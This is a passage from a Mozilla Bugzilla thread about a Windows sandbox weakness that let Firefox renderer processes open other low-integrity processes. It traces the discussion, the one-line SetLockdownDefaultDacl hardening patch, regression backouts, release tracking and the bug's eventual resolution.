> he did say "working towards moving to untrusted integrity level" -- that's not "fine with it", it's just hard retrofitting into a decade plus of the wrong architecture.
>
> > If a Chromium-like win32k lockdown mechanism will ever be introduced in the future, this would be a bypass.
>
> We're working hard on that, too.

I'd also add that it's not quite as simple as presenting the entire host filesystem to a compromised renderer.

The vast majority of the time the file content process will not be running and, other bugs that need fixing aside, in theory a compromised renderer should not be able to force the parent process to start it.

That said my thanks in [comment 1](/show_bug.cgi?id=1554110#c1 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes") was genuine, this is one of the things that we knew would be addressed by moving to untrusted, but having this bug filed has raised the awareness of that within Mozilla.

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1554110#c8)• 6 years ago |
|  | |

(In reply to Niklas Baumstark from [comment #5](/show_bug.cgi?id=1554110#c5 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> I guess I misposed the question: Unless Firefox requires doing OpenProcess for legitimate purposes, shouldn't it be possible to fix this bug without moving to untrusted integrity, and would that not be a warranted approach to this issue?

If you have ideas about how we can prevent this without going to untrusted then that would be great.

|  | [Niklas Baumstark](/user_profile?user_id=423505)  Reporter |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1554110#c9)• 6 years ago |
|  | |

I was thinking about a ObRegisterCallbacks hook on PsProcessType, which I believe is the canonical anti-debugging trick on Windows.

|  | [Niklas Baumstark](/user_profile?user_id=423505)  Reporter |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1554110#c10)• 6 years ago |
|  | |

Maybe this can also be done with just normal ACLs, unfortunately I'm not an expert in Windows security

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1554110#c11)• 6 years ago |
|  | |

(In reply to Niklas Baumstark from [comment #9](/show_bug.cgi?id=1554110#c9 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> I was thinking about a ObRegisterCallbacks hook on PsProcessType, which I believe is the canonical anti-debugging trick on Windows.

Ah right we don't currently use kernel drivers, so this solution would not be straight forward to roll out and indeed could introduce worse vulnerabilities.

It might also be possible for the process to work around such hooking.

|  | [Niklas Baumstark](/user_profile?user_id=423505)  Reporter |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1554110#c12)• 6 years ago |
|  | |

Oh I didn't realize this is a kernel API, please ignore. Anyways, will let you know if I come across anything useful.

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a556179_578488)• 6 years ago |

See Also: → [1555810](/show_bug.cgi?id=1555810 "RESOLVED INVALID - Make the privileged about/mozilla content processes Medium Integrity")

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1554110#c13)• 6 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1554110&comment_id=14152078 "1 revision") |
|  | |

(In reply to Niklas Baumstark from [comment #10](/show_bug.cgi?id=1554110#c10 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> Maybe this can also be done with just normal ACLs, unfortunately I'm not an expert in Windows security

It looks like you can do exactly this, thanks!

The CreateProcessAsUser function can take two LPSECURITY\_ATTRIBUTES arguments, which allows you to set the security descriptor for the process and thread.

If I pass a security descriptor with just the user in the dacl, then the OpenProcess fails, because the normal content processes have the user removed from their access token.

Then I found a setting that had been added to the sandbox policy a while ago that doesn't add the Restricted SID and removes the Logon SID from the ACL on the access token used to create the process.

This is what is used to get the security descriptor if null is passed for the LPSECURITY\_ATTRIBUTES for the process and thread, so this is a really simple change to achieve the same result.

|  | [Niklas Baumstark](/user_profile?user_id=423505)  Reporter |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1554110#c14)• 6 years ago |
|  | |

If I understand you correctly, then taking the approach of modifying the token privileges rather than the process ACL is preferrable because it would also deal with the issue of the Chromium/Electron renderers.

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1554110#c15)• 6 years ago |
|  | |

Attached file
[Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!](attachment.cgi?id=9069004) (obsolete)
— [Details](attachment.cgi?id=9069004&action=edit)

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a623565_458623)• 6 years ago |

Assignee: nobody → bobowencodeStatus: NEW → ASSIGNEDPriority: P2 → P1

|  | [Niklas Baumstark](/user_profile?user_id=423505)  Reporter |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1554110#c16)• 6 years ago |
|  | |

Bob, is it possible for me to get access to this patch to test it on my local build, just out of curiosity?

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1554110#c17)• 6 years ago |
|  | |

(In reply to Niklas Baumstark from [comment #14](/show_bug.cgi?id=1554110#c14 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> If I understand you correctly, then taking the approach of modifying the token privileges rather than the process ACL is preferrable because it would also deal with the issue of the Chromium/Electron renderers.

Well it would potentially prevent other low integrity processes from opening our process (if they didn't have the User SID).

This doesn't affect whether our process can open other low integrity processes, we would need untrusted or a more restrictive access token for that, but it's a big step in the right direction.

For example the low integrity internet explorer process still has the Logon SID in its ACL with read access.

We still have that SID in our access token (this just removes it from our processes ACL), so we should still be able to get read access to that IE process.

(In reply to Niklas Baumstark from [comment #16](/show_bug.cgi?id=1554110#c16 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> Bob, is it possible for me to get access to this patch to test it on my local build, just out of curiosity?

Given that this is just a one line policy change, I'll paste it in here.

```
diff --git a/security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp b/security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp
--- a/security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp
+++ b/security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp
@@ -502,6 +502,8 @@ void SandboxBroker::SetSecurityLevelForC
       sandbox::SBOX_ALL_OK == result,
       "SetDelayedIntegrityLevel should never fail, what happened?");

+  mPolicy->SetLockdownDefaultDacl();
+
   sandbox::MitigationFlags mitigations =
       sandbox::MITIGATION_BOTTOM_UP_ASLR | sandbox::MITIGATION_HEAP_TERMINATE |
       sandbox::MITIGATION_SEHOP | sandbox::MITIGATION_DEP_NO_ATL_THUNK |

```

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1554110#c18)• 6 years ago |
|  | |

Comment on [attachment 9069004](/attachment.cgi?id=9069004 "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!") [[details]](/attachment.cgi?id=9069004&action=edit "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!")

[Bug 1554110](/show_bug.cgi?id=1554110 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"): SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not by itself, this is something that could contribute to a sandbox escape.

  It wouldn't take long for someone with the necessary understanding to work out what this protects against.

  I think landing this under a separate non security bug would be a good idea.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: All
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: If the patch doesn't apply or rebase, then it will be trivial to create new patches.
* **How likely is this patch to cause regressions; how much testing does it need?**: Unlikely, because sandboxed processes shouldn't be attempting to open each other.

  There is a very small risk that this could interfere with other software that might try to open our processes, but I think that is unlikely because they would tend to be running with more privileges anyway.
[Attachment #9069004](/attachment.cgi?id=9069004&action=edit "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!") -
Flags: sec-approval?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a999143_280903)• 6 years ago |

[status-firefox67.0.1](/buglist.cgi?f1=cf_status_firefox67_0_1&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox67_0_1&o1=equals&v1=wontfix)
[status-firefox68](/buglist.cgi?f1=cf_status_firefox68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=affected)
[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=affected)
[tracking-firefox68](/buglist.cgi?f1=cf_tracking_firefox68&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox68&o1=equals&v1=%2B)
[tracking-firefox69](/buglist.cgi?f1=cf_tracking_firefox69&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%2B)
[tracking-firefox-esr60](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=isnotempty):
--- → [68+](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=68%2B)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1554110#c19)• 6 years ago |
|  | |

Comment on [attachment 9069004](/attachment.cgi?id=9069004 "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!") [[details]](/attachment.cgi?id=9069004&action=edit "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!")

[Bug 1554110](/show_bug.cgi?id=1554110 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"): SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!

sec-approval+ for trunk. We'll want this on beta and ESR60 as well so please create and nominate patches for those branches.

[Attachment #9069004](/attachment.cgi?id=9069004&action=edit "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!") -
Flags: sec-approval? → sec-approval+

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1554110#c20)• 6 years ago |
|  | |

(In reply to Al Billings [:abillings] from [comment #19](/show_bug.cgi?id=1554110#c19 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> Comment on [attachment 9069004](/attachment.cgi?id=9069004 "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!") [[details]](/attachment.cgi?id=9069004&action=edit "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!")
>
> [Bug 1554110](/show_bug.cgi?id=1554110 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"): SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!
>
> sec-approval+ for trunk. We'll want this on beta and ESR60 as well so please create and nominate patches for those branches.

Landed via [bug 1557282](/show_bug.cgi?id=1557282 "RESOLVED FIXED - Add SetLockdownDefaultDacl to the content process sandbox policy for Windows.") (deliberately not linked).

The patch for m-c imports cleanly for beta, I'll add one for ESR60 on [bug 1557282](/show_bug.cgi?id=1557282 "RESOLVED FIXED - Add SetLockdownDefaultDacl to the content process sandbox policy for Windows.").

NI to jcristau and RyanVM, so they're aware of this for the approval requests, which I'll make on that bug.

Flags: needinfo?(ryanvm)Flags: needinfo?(jcristau)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a1131400_75935)• 6 years ago |

Flags: needinfo?(ryanvm)

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1554110#c21)• 6 years ago |
|  | |

This has just been backed out, looks like some audio/media issue.

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1554110#c22)• 6 years ago |
|  | |

I guess this won't make 68 at this point.

[status-firefox68](/buglist.cgi?f1=cf_status_firefox68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox-esr60](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=isnotempty):
[68+](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=68%2B) → [69+](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=69%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [69+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=69%2B)Flags: needinfo?(jcristau)

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1554110#c23)• 6 years ago |
|  | |

In [bug 1557282](/show_bug.cgi?id=1557282 "RESOLVED FIXED - Add SetLockdownDefaultDacl to the content process sandbox policy for Windows.") I'm going to try landing this again just for windows 10.

I've filed [bug 1564842](/show_bug.cgi?id=1564842 "RESOLVED DUPLICATE - Add SetLockdownDefaultDacl to the content process sandbox policy for Windows 8.1 and earlier.") for landing this for earlier versions, possibly once audio remoting has been enabled.

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1554110#c24)• 6 years ago |
|  | |

Comment on [attachment 9069004](/attachment.cgi?id=9069004 "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!") [[details]](/attachment.cgi?id=9069004&action=edit "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!")

[Bug 1554110](/show_bug.cgi?id=1554110 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"): SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!

Revision D33301 was moved to [bug 1557282](/show_bug.cgi?id=1557282 "RESOLVED FIXED - Add SetLockdownDefaultDacl to the content process sandbox policy for Windows."). Setting [attachment 9069004](/attachment.cgi?id=9069004 "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!") [[details]](/attachment.cgi?id=9069004&action=edit "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!") to obsolete.

[Attachment #9069004](/attachment.cgi?id=9069004&action=edit "Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!") -
Attachment is obsolete: true

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1554110#c25)• 5 years ago |
|  | |

Too late for this cycle.

[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix)
[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix)
[tracking-firefox-esr60](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=isnotempty):
[69+](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=69%2B) → ---
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[69+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=69%2B) → [?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1554110#c26)• 5 years ago |
|  | |

Bob, want to give this another try for 71/70?

[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=%3F)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B)Flags: needinfo?(bobowencode)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1554110#c27)• 5 years ago |
|  | |

Following up in email with Bob and jimm.

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1554110#c28)• 5 years ago |
|  | |

From email with :gcp, this is blocked partly by [bug 1432303](/show_bug.cgi?id=1432303 "RESOLVED FIXED - Enable AudioIPC on Windows"), and possibly by [bug 1567385](/show_bug.cgi?id=1567385 "RESOLVED FIXED - 20.8% tabswitch (windows10-64-shippable) regression on push aaf7ae8412559f328b121cc8e392b1737ce40131 (Thu July 11 2019)") as well.

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1554110#c29)• 5 years ago |
|  | |

Following up in email with :kinetik and :drno.

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1554110#c30)• 5 years ago |
|  | |

From discussion with kinetik, we are aiming a fix at 71.

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected) → [fix-optional](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fix-optional)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=%3F) → [affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected)

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1554110#c31)• 5 years ago |
|  | |

(In reply to Liz Henry (:lizzard) from [comment #30](/show_bug.cgi?id=1554110#c30 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> From discussion with kinetik, we are aiming a fix at 71.

Thanks lizzard (sorry, must have missed this comment first time, only noticed with the email from the CCs being added).

One idea we had (if the audio issue is fixed), is to only call SetLockdownDefaultDacl on the processes that we want to protect.

So, the file content process and certain other "privileged" content processes. In the hope that we can live with the performance and profiling issues in those processes.

I think it should be fairly straight forward to pass through the remote type instead of just a bool for the file content process to [1]

tjr - I think you're more familiar with these new remote types - which ones do you think we would need to protect? (Also, do you think that we might live with the other issues in these process types?)

[1] <https://searchfox.org/mozilla-central/rev/1fe0cf575841dbf3b7e159e88ba03260cd1354c0/security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp#419>

Flags: needinfo?(bobowencode) → needinfo?(tom)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1554110#c32)• 5 years ago |
|  | |

We have three types of content processes we would want to protect: file, privilegedabout, and privilegedmozillacontent. privilegedabout hosts about:newtab and that's got to be fast. privilegedmozillacontent hosts FXA which does in-browser crypto so while it's not a bright red flag like newtab, it is something to be somewhat concerned about.

Note that once we get Fission, we would also need to apply this to regular content processes too. If that isn't done in this bug, it should be a separate bug that blocks [Bug 1505832](/show_bug.cgi?id=1505832 "NEW - [meta] Fission Site Sandboxing")

It's an ugly dependency graph to draw out "If we apply it to X but not Y we're leaving ourselves vulnerable to Z which negates the benefit of applying it to X" - but I don't think that's necessary. If we can apply it to X, we should, even if we don't derive the benefit today.

Flags: needinfo?(tom)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a16607101_75935)• 5 years ago |

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[fix-optional](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fix-optional) → [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix)
[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
--- → [fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
--- → [fix-optional](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fix-optional)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1554110#c33)• 5 years ago |
|  | |

Should we mark this bug as stalled?

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional) → [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
[fix-optional](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fix-optional) → [wontfix](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=wontfix)
[status-firefox74](/buglist.cgi?f1=cf_status_firefox74&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=wontfix)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=wontfix)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F) → ---

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1554110#c34)• 5 years ago |
|  | |

(In reply to Ryan VanderMeulen [:RyanVM] from [comment #33](/show_bug.cgi?id=1554110#c33 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> Should we mark this bug as stalled?

No; it's blocked on Audio IPC but there is no additional information we need (that we can't get) to justify marking it stalled.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a22063904_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1554110#c35)• 5 years ago |
|  | |

Update on recent progress on regressions caused by the SetLockdownDefaultDacl fix:

* Audio remoting is riding the trains.
* I have a patch for the profiler stack issue.
* Performance issues appear to be multifaceted:
  + OpenProcessToken - reasonably good fix for this to prevent brokering to the parent.
  + Appears to break DWrite cache (which we think we need to do deliberately at some point) - this does not affect us when there is no acceleration or when webrender is enabled, so could enable in those cases.
  + Two above appear to fix tabswitch performance regressions ([bug 1567385](/show_bug.cgi?id=1567385 "RESOLVED FIXED - 20.8% tabswitch (windows10-64-shippable) regression on push aaf7ae8412559f328b121cc8e392b1737ce40131 (Thu July 11 2019)")), but not tp6 cold start regressions ([bug 1566744](/show_bug.cgi?id=1566744 "RESOLVED FIXED - 2.26 - 14.81% raptor-tp6-facebook-firefox-cold / raptor-tp6-google-firefox-cold / (windows10-64-shippable, windows10-64-shippable-qr, windows7-32-shippable) regression on push 9559ef8f347dc0e4e92546954472d4153283d5f2 (Thu July 11 2019)")), need to investigate those further.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a24659245_1689)• 5 years ago |

See Also: → [CVE-2020-12388](/show_bug.cgi?id=1618911 "RESOLVED FIXED - Firefox: Default Content Process DACL Sandbox Escape")

|  | [Gian-Carlo Pascutto [:gcp]](/user_profile?user_id=151147) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1554110#c36)• 5 years ago |
|  | |

Bob, has this been fixed now that [bug 1618911](/show_bug.cgi?id=1618911 "RESOLVED FIXED - Firefox: Default Content Process DACL Sandbox Escape") landed?

Flags: needinfo?(bobowencode)

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1554110#c37)• 5 years ago |
|  | |

(In reply to Gian-Carlo Pascutto [:gcp] from [comment #36](/show_bug.cgi?id=1554110#c36 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> Bob, has this been fixed now that [bug 1618911](/show_bug.cgi?id=1618911 "RESOLVED FIXED - Firefox: Default Content Process DACL Sandbox Escape") landed?

Yes, I've resolved instead of duplicated, because the attacks were different even though the underlying cause and fix were the same.

Status: ASSIGNED → RESOLVEDClosed: 5 years ago
[status-firefox75](/buglist.cgi?f1=cf_status_firefox75&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=wontfix)
[status-firefox76](/buglist.cgi?f1=cf_status_firefox76&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=fixed)Flags: needinfo?(bobowencode)Resolution: --- → FIXED

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a27144707_75935)• 5 years ago |

Group: dom-core-security → core-security

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a27611869_1689)• 5 years ago |

Group: core-security → core-security-release

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1554110#c38)• 5 years ago |
|  | |

If the fix in [bug 1618911](/show_bug.cgi?id=1618911 "RESOLVED FIXED - Firefox: Default Content Process DACL Sandbox Escape") was backported to ESR68, is this bug also fixed in ESR68? It got marked "wontfix" a couple months ago for some reason.

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[wontfix](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=wontfix) → [?](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=%3F)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [76+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=76%2B)Flags: needinfo?(bobowencode)

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1554110#c39)• 5 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #38](/show_bug.cgi?id=1554110#c38 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

> If the fix in [bug 1618911](/show_bug.cgi?id=1618911 "RESOLVED FIXED - Firefox: Default Content Process DACL Sandbox Escape") was backported to ESR68, is this bug also fixed in ESR68? It got marked "wontfix" a couple months ago for some reason.

yeah, I guess it was originally a won't fix, but that changed with the severity being increased due to the full escape

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=%3F) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)Flags: needinfo?(bobowencode)

|  | [Cornel Ionce [:noni] [Hubs QA]](/user_profile?user_id=458186) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a29368102_458186)• 5 years ago |

Flags: qe-verify-Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a29473393_428608)• 5 years ago |

